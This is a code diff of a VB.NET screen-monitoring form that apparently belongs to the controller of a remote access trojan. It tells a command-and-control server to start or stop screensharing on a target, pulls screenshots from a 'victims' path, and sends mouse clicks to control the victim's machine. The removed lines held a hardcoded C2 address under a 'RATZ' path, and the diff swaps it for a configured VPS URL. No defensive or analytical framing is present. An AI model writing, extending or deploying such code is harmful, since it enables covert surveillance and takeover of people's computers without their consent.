@@ -8,9 +8,11 @@ Imports System.Threading
 
 Public Class ScreenMonitor
     Public targetIp As String = ""
+    Private isStopped As Boolean = True
     Private transmissionThread As Thread = Nothing
     Private startMonitorSpamWC, fluxManagementWC As New WebClient()
     Private connectionEstablished As Boolean = False
+    Private lastFrameLength As Integer = 0
 
     Public xPosRemote As String = ""
     Public yPosRemote As String = ""
@@ -35,25 +37,40 @@ Public Class ScreenMonitor
         End If
     End Function
 
+    Private Sub StartScreenshare()
+        Dim client = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=start&actioncontent2=" & StringQualityToLong(Quality.SelectedItem.ToString) & "&actioncontent3=" & 1000 / FPS.SelectedItem)
+        If isStopped Then isStopped = False
+    End Sub
     Private Sub StopScreenshare()
         Dim client = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=stop")
+        connectionEstablished = False
+        isStopped = True
     End Sub
 
     Private Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
-        transmissionThread = New Thread(Sub() doTransmission(500 / Convert.ToInt32(FPS.SelectedItem)))
-        transmissionThread.Start()
-        StartButton.Text = "Loading..."
-        StartButton.Enabled = False
-        StopButton.Enabled = True
-        screenshotBTN.Enabled = False
+        If isStopped Then
+            transmissionThread = New Thread(Sub() DoTransmission(500 / Convert.ToInt32(FPS.SelectedItem)))
+            transmissionThread.Start()
+            screenshotBTN.Enabled = False
+            isStopped = False
+            StopButton.Enabled = True
+            StartButton.Enabled = False
+        Else
+            MsgBox("Screenshare is already running!", MsgBoxStyle.Information)
+        End If
     End Sub
     Private Sub StopButton_Click(sender As Object, e As EventArgs) Handles StopButton.Click
-        StopScreenshare()
-        transmissionThread.Abort()
-        Render.Image = Nothing
-        StopButton.Enabled = False
-        StartButton.Enabled = True
-        screenshotBTN.Enabled = True
+        If Not isStopped Then
+            StopScreenshare()
+            transmissionThread.Abort()
+            Render.Image = Nothing
+            screenshotBTN.Enabled = True
+            connectionEstablished = False
+            StopButton.Enabled = False
+            StartButton.Enabled = True
+        Else
+            MsgBox("No screenshare is currently running.", MsgBoxStyle.Information)
+        End If
     End Sub
     Function DeflateDecompress(ByVal toDecompress As Byte()) As Byte()
         Try
@@ -80,6 +97,7 @@ Public Class ScreenMonitor
 
             Dim rawReceivedBytes As Byte() =
                 fluxManagementWC.DownloadData(My.Settings.vpsurl & "victims/" & targetIp & "/screenshot")
+            Dim frameLength As Integer = rawReceivedBytes.Length
 
             If rawReceivedBytes.Length = 0 Then
                 Exit Try
@@ -88,17 +106,17 @@ Public Class ScreenMonitor
             Render.Image = New Bitmap(New MemoryStream(DeflateDecompress(rawReceivedBytes)))
             Render.Refresh()
 
+            connectionEstablished = frameLength <> lastFrameLength
+            lastFrameLength = frameLength
+
             Dim msTimeout As Integer =
                 interval - Date.Now.Subtract(startTime).TotalMilliseconds
 
             If msTimeout < 1 Then
                 GC.Collect()
-                Exit Try
             Else
                 Thread.Sleep(msTimeout)
             End If
-
-            connectionEstablished = True
         Catch ex As Exception When TypeOf ex Is WebException OrElse TypeOf ex Is ArgumentException
         End Try
 
@@ -106,11 +124,8 @@ Public Class ScreenMonitor
     End Sub
 
     Private Sub WaitForConnectionTimer_Tick(sender As Object, e As EventArgs) Handles WaitForConnectionTimer.Tick
-        If Not StartButton.Enabled AndAlso Not connectionEstablished Then
-            startMonitorSpamWC.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=start&actioncontent2=" & stringQualityToLong(Quality.SelectedItem.ToString) & "&actioncontent3=" & 1000 / FPS.SelectedItem)
-        ElseIf connectionEstablished Then
-            StartButton.Text = "Start Monitoring"
-            ' StartButton.Enabled = False
+        If Not isStopped And Not connectionEstablished Then
+            StartScreenshare()
         End If
     End Sub
 
@@ -147,16 +162,15 @@ displayimage:
     Private Sub Render_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Render.Click
         If e.Button = MouseButtons.Right Then
             If remotecontrol.Checked Then
-                sendcords.DownloadString("http://185.62.188.189/RATZ/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 3)
+                sendcords.DownloadString(My.Settings.vpsurl & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 3)
             End If
         End If
 
         If e.Button = MouseButtons.Left Then
             If remotecontrol.Checked Then
-                sendcords.DownloadString("http://185.62.188.189/RATZ/" & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 1)
+                sendcords.DownloadString(My.Settings.vpsurl & "clients.php?action=sendcords&target=" & targetIp & "&actioncontent=" & xPosRemote & "&actioncontent2=" & yPosRemote & "&actioncontent3=" & 1)
             End If
         End If
-
     End Sub
 
 #End Region
